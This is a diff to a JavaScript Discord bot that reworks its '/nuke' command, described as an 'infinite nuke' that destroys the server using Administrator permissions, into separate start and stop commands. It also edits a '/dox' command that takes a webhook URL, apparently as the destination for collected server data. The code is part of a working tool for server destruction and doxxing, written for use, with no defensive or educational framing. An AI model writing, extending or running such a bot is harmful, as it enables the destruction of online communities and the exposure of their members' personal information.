@@ -41,19 +41,11 @@ async function registerCommands() {
         await client.application.commands.set([
             {
                 name: 'nuke',
-                description: '💀 Infinite nuke - destroys the server',
-                options: [
-                    {
-                        name: 'action',
-                        type: 3,
-                        description: 'Start or stop the nuke',
-                        required: true,
-                        choices: [
-                            { name: 'Start Nuke', value: 'start' },
-                            { name: 'Stop Nuke', value: 'stop' }
-                        ]
-                    }
-                ]
+                description: '💀 Starts the infinite nuke'
+            },
+            {
+                name: 'stop',
+                description: '⏹️ Stops the nuke'
             },
             {
                 name: 'dox',
@@ -78,7 +70,7 @@ async function registerCommands() {
 client.on('interactionCreate', async (interaction) => {
     if (!interaction.isChatInputCommand()) return;
 
-    const { commandName, options } = interaction;
+    const { commandName } = interaction;
 
     // ---- NUKE COMMAND ----
     if (commandName === 'nuke') {
@@ -98,31 +90,30 @@ client.on('interactionCreate', async (interaction) => {
             return interaction.editReply('❌ I need **Administrator** permissions to nuke.');
         }
 
-        const action = options.getString('action');
-
-        if (action === 'start') {
-            if (nukeRunning) {
-                return interaction.editReply('❌ A nuke is already running. Use `/nuke action:stop` to stop it first.');
-            }
-
-            nukeRunning = true;
-            nukeGuildId = guild.id;
-
-            await interaction.editReply('🚀 **NUKE STARTED!** Use `/nuke action:stop` to stop it.');
-
-            // Start the nuke
-            await startNuke(guild);
-
-        } else if (action === 'stop') {
-            if (!nukeRunning) {
-                return interaction.editReply('❌ No nuke is currently running.');
-            }
-
-            nukeRunning = false;
-            nukeGuildId = null;
-
-            await interaction.editReply('⏹️ **Nuke stopped.**');
+        if (nukeRunning) {
+            return interaction.editReply('❌ A nuke is already running. Use `/stop` to stop it first.');
         }
+
+        nukeRunning = true;
+        nukeGuildId = guild.id;
+
+        await interaction.editReply('🚀 **NUKE STARTED!** Use `/stop` to stop it.');
+
+        await startNuke(guild);
+    }
+
+    // ---- STOP COMMAND ----
+    if (commandName === 'stop') {
+        await interaction.deferReply({ ephemeral: true });
+
+        if (!nukeRunning) {
+            return interaction.editReply('❌ No nuke is currently running.');
+        }
+
+        nukeRunning = false;
+        nukeGuildId = null;
+
+        await interaction.editReply('⏹️ **Nuke stopped.**');
     }
 
     // ---- DOX COMMAND ----
@@ -134,7 +125,7 @@ client.on('interactionCreate', async (interaction) => {
             return interaction.editReply('❌ This command can only be used in a server.');
         }
 
-        const wh = options.getString('webhook');
+        const wh = interaction.options.getString('webhook');
         if (!wh || !wh.startsWith('https://discord.com/api/webhooks/')) {
             return interaction.editReply('❌ Invalid webhook URL.');
         }
